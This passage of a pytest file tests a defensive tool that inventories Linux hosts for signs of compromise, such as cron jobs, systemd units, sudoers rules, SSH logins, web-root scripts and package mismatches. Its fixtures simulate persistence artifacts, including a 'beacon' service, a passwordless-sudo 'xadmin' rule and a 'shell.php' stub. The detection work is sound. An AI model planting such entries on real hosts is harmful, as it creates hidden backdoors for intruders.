    if shell == 'bash':
        pytest.skip('line endings do not depend on the shell')
    rules = (SKILLS.parents[2] / '.gitattributes').read_text().splitlines()
    files = sorted((SKILLS / 'compromise-host-check').rglob('*.md'))

    crlf = [path.name for path in files if b'\r' in path.read_bytes()]

    assert 'plugins/** text eol=lf' in rules
    assert files
    assert crlf == []


@NEEDS_PROC_FD
def test_a_sealed_copy_with_a_directory_secret_still_hashes_itself(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'protect=/app/conf', sealed=True
    )

    run = result.records('run')[0]
    script = re.sub(r'^R=$', f"R='{root}'", _script(), count=1, flags=re.M)
    assert run['sha256'] == sha256(script.encode()).hexdigest()


def test_a_package_owned_secret_directory_keeps_package_verification(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/conf/key', 'secret\n')
    log = tmp_path / 'dpkg.log'

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/conf',
        DPKG_SEARCH_EXIT='0',
        DPKG_SEARCH_OUT='ssl-cert: /app/conf',
        DPKG_LOG=str(log),
    )

    assert '--search' not in log.read_text()
    assert '--verify' in log.read_text()
    assert all(row['kind'] != 'pkg_modified' for row in result.records('unknown'))


def test_a_secret_record_names_whether_it_is_a_file_or_a_directory(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'app/.env', 'TOKEN=fixture\n')
    _write(root, 'app/conf/key', 'secret\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'protect=/app/.env',
        'protect=/app/conf',
        'protect=/app/missing',
    )

    types = {row['path']: row['type'] for row in result.records('secret')}
    assert types == {'/app/.env': 'file', '/app/conf': 'directory', '/app/missing': '?'}


def test_a_secret_argument_is_refused_so_the_key_is_never_sent(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'secret=/app/.env')

    assert result.lines[-1].startswith('end status=refused ')


def test_inspect_mode_looks_only_at_the_named_items(tmp_path: Path, shell: str):
    result = _inspect_host(tmp_path, shell)

    kinds = {line.split(' ', 1)[0] for line in result.lines}

    assert result.code == 0, result.stderr
    assert 'account' not in kinds
    assert 'check kind=inspect status=complete' in result.lines
    assert result.lines[-1].startswith('end status=complete')


def test_inspect_names_the_programs_but_never_their_arguments(
    tmp_path: Path, shell: str
):
    result = _inspect_host(tmp_path, shell)

    programs = {
        (row['source'], row['key'], row['program']) for row in result.records('exec')
    }

    assert programs == {
        ('/etc/systemd/system/beacon.service', 'ExecStartPre', '/usr/local/bin/beacon'),
        ('/etc/systemd/system/beacon.service', 'ExecStart', '/usr/local/bin/beacon'),
        ('/etc/cron.d/beacon', 'cron', '/usr/local/bin/beacon'),
    }
    assert len(result.records('exec')) == 4
    assert all(
        row['sha256'] == sha256(b'binary\n').hexdigest()
        for row in result.records('exec')
    )
    assert 'hunter2' not in '\n'.join(result.lines)


def test_inspect_finds_the_program_behind_a_shell_cron_line(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    tool = _write(root, 'usr/local/sbin/scrub', '#!/bin/sh\n')
    tool.chmod(0o755)
    _write(root, 'etc/scrub.conf', 'key=hunter2\n')
    _write(
        root,
        'etc/cron.d/scrub',
        '30 3 * * 0 root test -e /run/systemd/system || '
        '/usr/local/sbin/scrub /etc/scrub.conf --password=hunter2\n',
    )

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'inspect=/etc/cron.d/scrub'
    )

    programs = [row['program'] for row in result.records('exec')]
    assert programs == ['test', '/usr/local/sbin/scrub']
    assert 'hunter2' not in '\n'.join(result.lines)


def test_inspect_reports_the_file_and_its_package_state(tmp_path: Path, shell: str):
    result = _inspect_host(tmp_path, shell, 'inspect=/etc/cron.d/beacon')

    record = result.records('file')[0]

    assert record['path'] == '/etc/cron.d/beacon'
    assert record['package'] == '-'
    assert record['verify'] == 'none'
    assert record['links'] == '1'
    assert record['atime'].endswith('Z')


def test_inspect_summarizes_the_journal_without_messages(tmp_path: Path, shell: str):
    result = _inspect_host(tmp_path, shell, 'inspect=/etc/cron.d/beacon')

    rows = result.records('journal')

    assert [(row['comm'], row['unit'], row['count']) for row in rows] == [
        ('bash', 'session-3.scope', '2')
    ]
    assert 'hunter2' not in '\n'.join(result.lines)


def test_inspect_finds_logins_with_a_named_key(tmp_path: Path, shell: str):
    result = _inspect_host(tmp_path, shell, 'inspect=/home/alice/.ssh/authorized_keys')

    logins = result.records('key_login')

    assert [(row['fp'], row['user'], row['from']) for row in logins] == [
        ('SHA256:AAAAC3Nz', 'alice', '203.0.113.9')
    ]
    assert 'note' not in '\n'.join(result.lines)


def test_inspect_follows_a_process_to_its_parents(tmp_path: Path, shell: str):
    result = _inspect_host(tmp_path, shell, 'inspect=/proc/4121')

    process = result.records('process')[0]

    assert process['comm'] == 'beacon'
    assert process['deleted'] == 'no'
    assert process['sha256'] == sha256(b'binary\n').hexdigest()
    assert process['chain'] == '900:bash,1:systemd'


def test_inspect_never_opens_a_protected_file(tmp_path: Path, shell: str):
    result = _inspect_host(
        tmp_path, shell, 'protect=/etc/cron.d/beacon', 'inspect=/etc/cron.d/beacon'
    )

    assert result.records('file') == []
    assert (
        'unknown kind=inspect path=/etc/cron.d/beacon reason=secret-overlap'
    ) in result.lines


def test_inspect_reports_missing_targets_and_bad_pids(tmp_path: Path, shell: str):
    result = _inspect_host(
        tmp_path,
        shell,
        'inspect=/etc/missing',
        'inspect=/proc/self',
        'inspect=/proc/77',
    )

    reasons = {(row['path'], row['reason']) for row in result.records('unknown')}

    assert reasons == {
        ('/etc/missing', 'absent'),
        ('/proc/self', 'malformed'),
        ('/proc/77', 'exited'),
    }


def test_inspect_without_journalctl_is_unknown_for_the_journal(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root /bin/true\n')

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', 'inspect=/etc/cron.d/job'
    )

    assert result.records('file')[0]['path'] == '/etc/cron.d/job'
    assert (
        'unknown kind=inspect path=/etc/cron.d/job reason=missing-tool:journalctl'
    ) in result.lines


def test_an_sshd_include_outside_the_default_directory_is_unknown(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(
        root,
        'etc/ssh/sshd_config',
        'Include sshd_config.d/*.conf\nInclude /etc/ssh/custom/*.conf\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert (
        'unknown kind=authkey path=/etc/ssh/sshd_config reason=include-outside-default'
    ) in result.lines
    assert (
        len([row for row in result.records('unknown') if row['kind'] == 'authkey']) == 1
    )


@pytest.mark.parametrize(
    ('kind', 'relative'),
    [
        ('cron', 'etc/cron.yearly/job'),
        ('systemd_unit', 'run/systemd/user/beacon.service'),
        ('systemd_unit', 'etc/systemd/system-generators/beacon'),
        ('systemd_unit', 'usr/local/lib/systemd/system-generators/beacon'),
    ],
)
def test_more_scheduled_and_unit_paths_are_collected(
    tmp_path: Path, shell: str, kind: str, relative: str
):
    root = _host_tree(tmp_path)
    _write(root, relative, '#!/bin/sh\n', BEFORE)

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert f'/{relative}' in {row['path'] for row in result.records(kind)}


@pytest.mark.parametrize('name', ['admin.disabled', 'admin~'])
def test_sudoers_files_that_sudo_skips_are_not_collected(
    tmp_path: Path, shell: str, name: str
):
    root = _host_tree(tmp_path)
    _write(root, f'etc/sudoers.d/{name}', 'xadmin ALL=(ALL) NOPASSWD: ALL\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert [row['path'] for row in result.records('sudoers')] == ['/etc/sudoers']
    assert 'check kind=sudoers status=complete' in result.lines


def test_a_package_file_the_verifier_cannot_read_is_unknown(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'rpm', 'last', 'ssh-keygen'),
        RPM_OUT=(
            'missing     /usr/share/doc/gone\n'
            'missing   c /etc/locked.conf (Permission denied)'
        ),
    )

    assert result.records('pkg_modified') == []
    assert (
        'unknown kind=pkg_modified path=/etc/locked.conf reason=unreadable'
        in result.lines
    )
    assert 'check kind=pkg_modified status=unknown' in result.lines


def test_a_login_without_a_remote_address_keeps_its_start_time(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    last_out = (
        'alice tty1 2026-09-14T03:11:02+00:00 - 2026-09-14T03:15:00+00:00\n'
        'wtmp begins 2026-07-01T00:00:00+00:00'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}', LAST_OUT=last_out)

    login = result.records('login')[0]
    assert (login['from'], login['start']) == ('', '2026-09-14T03:11:02Z')


@pytest.mark.parametrize(
    'relative',
    [
        'run/systemd/transient/session-42.scope',
        'run/systemd/system/session-7.scope.d/50-Slice.conf',
        'run/systemd/system/user-1000.slice',
    ],
)
def test_runtime_scopes_and_slices_are_not_collected(
    tmp_path: Path, shell: str, relative: str
):
    root = _host_tree(tmp_path)
    _write(root, relative, '[Scope]\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert f'/{relative}' not in {row['path'] for row in result.records('systemd_unit')}


def test_a_read_only_mount_reports_that_atime_is_not_recorded(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(
        root,
        'proc/self/mountinfo',
        '1 0 0:1 / / rw,relatime - ext4 r rw\n2 1 0:2 /s /secrets ro,relatime - tmpfs t ro\n',
    )
    _write(root, 'secrets/token', 'fixture\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/secrets/token')

    assert result.records('secret')[0]['atime_mode'] == 'readonly'


def test_the_last_mount_on_a_mount_point_decides_its_atime_mode(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    mounts = (
        '1 0 0:1 / / rw,relatime - ext4 r rw\n'
        '2 1 0:2 /app /app rw,relatime - ext4 a rw\n'
        '3 2 0:3 /app /app rw,noatime - ext4 b rw\n'
    )
    _write(root, 'proc/self/mountinfo', mounts)
    _write(root, 'app/.env', 'fixture\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'protect=/app/.env')

    assert result.records('secret')[0]['atime_mode'] == 'noatime'


def test_package_mismatches_carry_the_file_times(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'usr/bin/changed', 'x\n', BEFORE)

    result = _collect(
        tmp_path, shell, root, f'since={SINCE}', DPKG_OUT='??5??????   /usr/bin/changed'
    )

    row = result.records('pkg_modified')[0]
    assert (row['mtime'], row['ctime'] != '?') == ('2025-07-31T22:13:20Z', True)


def test_merged_usr_units_are_listed_once_with_their_package_owner(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'usr/lib/systemd/system/ssh.service', '[Service]\n')
    (root / 'lib').symlink_to('usr/lib')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='0',
        DPKG_SEARCH_OUT='openssh-server: /lib/systemd/system/ssh.service',
    )

    units = [
        (row['path'], row['packaged'])
        for row in result.records('systemd_unit')
        if row['path'].endswith('/ssh.service')
    ]
    assert units == [('/usr/lib/systemd/system/ssh.service', 'yes')]


def test_multiarch_package_owners_count_as_packaged(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/job', '* * * * * root true\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='0',
        DPKG_SEARCH_OUT='libfoo:amd64, libbar: /etc/cron.d/job',
    )

    assert result.records('cron')[0]['packaged'] == 'yes'


def test_rpm_ownership_survives_several_unowned_paths(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    for name in ('a', 'b', 'c'):
        _write(root, f'etc/cron.d/{name}', '* * * * * root true\n')
    owned = (
        '/etc/cron.d/a\n'
        'file /etc/cron.d/b is not owned by any package\n'
        'file /etc/cron.d/c is not owned by any package'
    )

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        tools=('ss', 'rpm', 'last', 'ssh-keygen'),
        RPM_QUERY_OUT=owned,
        RPM_QUERY_EXIT='2',
    )

    assert [row['packaged'] for row in result.records('cron')] == ['yes', 'no', 'no']


def test_a_symlinked_cron_file_is_searched_and_timed_through_its_target(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    target = _write(root, 'opt/app/job', '* * * * * root /tmp/beacon\n', 1_830_000_000)
    link = root / 'etc/cron.d/app'
    link.symlink_to(target)
    os.utime(link, (BEFORE, BEFORE), follow_symlinks=False)

    result = _collect(tmp_path, shell, root, 'since=2027-06-01', 'pattern=beacon')

    cron = result.records('cron')[0]
    assert (cron['hits'], cron['mtime']) == ('1@1', '2027-12-28T13:20:00Z')
    assert cron['sha256'] == sha256(target.read_bytes()).hexdigest()


def test_socket_without_a_process_reports_no_process(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        SS_EST='ESTAB 0 0 10.0.0.1:900 10.0.0.2:2049',
    )

    assert 'unknown kind=connection path= reason=no-process' in result.lines


def test_a_process_that_exited_reports_exited(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        SS_EST='ESTAB 0 0 10.0.0.1:5000 203.0.113.9:443 users:(("gone",pid=77,fd=3))',
    )

    assert 'unknown kind=connection path=/proc/77 reason=exited' in result.lines
    assert 'reason=unreadable' not in '\n'.join(result.lines)


def test_a_local_login_shown_as_zero_address_has_no_source(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    last_out = (
        'alice pts/3 0.0.0.0 2026-09-14T03:11:02+00:00 - 2026-09-14T03:15:00+00:00\n'
        'wtmp begins 2026-07-01T00:00:00+00:00'
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}', LAST_OUT=last_out)

    assert result.records('login')[0]['from'] == ''


def test_a_glob_secret_through_an_unsearchable_directory_is_unknown(
    tmp_path: Path, shell: str
):
    if os.geteuid() == 0:
        pytest.skip('root can search a mode-000 fixture')
    root = _host_tree(tmp_path)
    _write(root, 'home/alice/.aws/credentials', 'fixture\n')
    _write(root, 'home/bob/.aws/credentials', 'fixture\n')
    (root / 'home/bob').chmod(0)
    try:
        result = _collect(
            tmp_path, shell, root, f'since={SINCE}', 'protect=/home/*/.aws/credentials'
        )
    finally:
        (root / 'home/bob').chmod(0o755)

    assert [row['path'] for row in result.records('secret')] == [
        '/home/alice/.aws/credentials'
    ]
    assert (
        'unknown kind=secret path=/home/%2A/.aws/credentials reason=unsearchable'
        in result.lines
    )


def test_a_dangling_rc_local_symlink_is_recorded(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    (root / 'etc/rc.local').symlink_to('/opt/gone/rc')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert [row['path'] for row in result.records('rc_local')] == ['/etc/rc.local']


def test_an_enable_link_to_a_packaged_unit_keeps_its_own_times(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    target = _write(root, 'usr/lib/systemd/system/ssh.service', '[Service]\n')
    (root / 'lib').symlink_to('usr/lib')
    link = root / 'etc/systemd/system/multi-user.target.wants/ssh.service'
    link.parent.mkdir(parents=True)
    link.symlink_to(root / 'lib/systemd/system/ssh.service')
    os.utime(link, (BEFORE, BEFORE), follow_symlinks=False)

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='1',
        DPKG_SEARCH_OUT='openssh-server: /lib/systemd/system/ssh.service',
    )

    wanted = next(
        row
        for row in result.records('systemd_unit')
        if row['path'].endswith('.wants/ssh.service')
    )
    assert (wanted['packaged'], wanted['mtime']) == ('no', '2025-07-31T22:13:20Z')
    assert target.exists()


def test_web_directory_links_are_walked_inside_the_root_only(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/releases/1/shell.php', '<?php ?>\n')
    (root / 'var/www/html/current').symlink_to(root / 'var/www/html/releases/1')
    (root / 'var/www/html/releases/1/loop').symlink_to(root / 'var/www/html')
    _write(root, 'srv/shared/uploads/up.php', '<?php ?>\n')
    (root / 'var/www/html/uploads').symlink_to(root / 'srv/shared/uploads')

    result = _collect(tmp_path, shell, root, f'since={SINCE}', 'webroot=/var/www/html')

    paths = [row['path'] for row in result.records('webroot_file')]
    assert len(paths) == 1
    assert paths[0].endswith('/shell.php')
    assert (
        'unknown kind=webroot_file path=/var/www/html/uploads reason=outside-webroot'
        in result.lines
    )


def test_sshd_keywords_written_with_an_equals_sign_are_read(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/ssh/sshd_config', 'AuthorizedKeysFile=/etc/keys/%u\n')

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert (
        'unknown kind=authkey path=/etc/ssh/sshd_config '
        'reason=non-default-authorized-keys-file'
    ) in result.lines


def test_a_web_script_link_is_selected_by_its_target_change_time(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    target = _write(root, 'srv/shared/config.php', '<?php ?>\n', 1_830_000_000)
    link = root / 'var/www/html/config.php'
    link.symlink_to(target)
    os.utime(link, (BEFORE, BEFORE), follow_symlinks=False)

    result = _collect(
        tmp_path, shell, root, 'since=2027-06-01', 'webroot=/var/www/html'
    )

    assert [row['path'] for row in result.records('webroot_file')] == [
        '/var/www/html/config.php'
    ]


def test_a_dpkg_diversion_does_not_make_a_file_packaged(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(root, 'etc/cron.d/evil', '* * * * * root /tmp/x\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        DPKG_SEARCH_EXIT='0',
        DPKG_SEARCH_OUT='local diversion from: /etc/cron.d/evil\nlocal diversion to: /etc/cron.d/evil.distrib',
    )

    assert result.records('cron')[0]['packaged'] == 'no'


def test_sudoers_defaults_lines_are_never_rules(tmp_path: Path, shell: str):
    root = _host_tree(tmp_path)
    _write(
        root,
        'etc/sudoers',
        'Defaults!/usr/local/bin/db-backup noexec\nDefaults>root env_reset\n'
        'Defaults:alice !lecture\nDefaults@web01 log_output\nroot ALL=(ALL:ALL) ALL\n',
    )

    result = _collect(tmp_path, shell, root, f'since={SINCE}')

    assert [row['principal'] for row in result.records('sudoers')] == ['root']
    assert 'db-backup' not in '\n'.join(result.lines)


def test_a_secret_directory_inside_a_web_root_is_never_listed(
    tmp_path: Path, shell: str
):
    root = _host_tree(tmp_path)
    _write(root, 'var/www/html/config/db.php', '<?php $pw = "fixture"; ?>\n')

    result = _collect(
        tmp_path,
        shell,
        root,
        f'since={SINCE}',
        'webroot=/var/www/html',
        'protect=/var/www/html/config',
    )

    assert result.records('webroot_file') == []
    assert (
        'unknown kind=webroot_file path=/var/www/html/config reason=secret-overlap'
    ) in result.lines
    assert 'db.php' not in '\n'.join(result.lines)
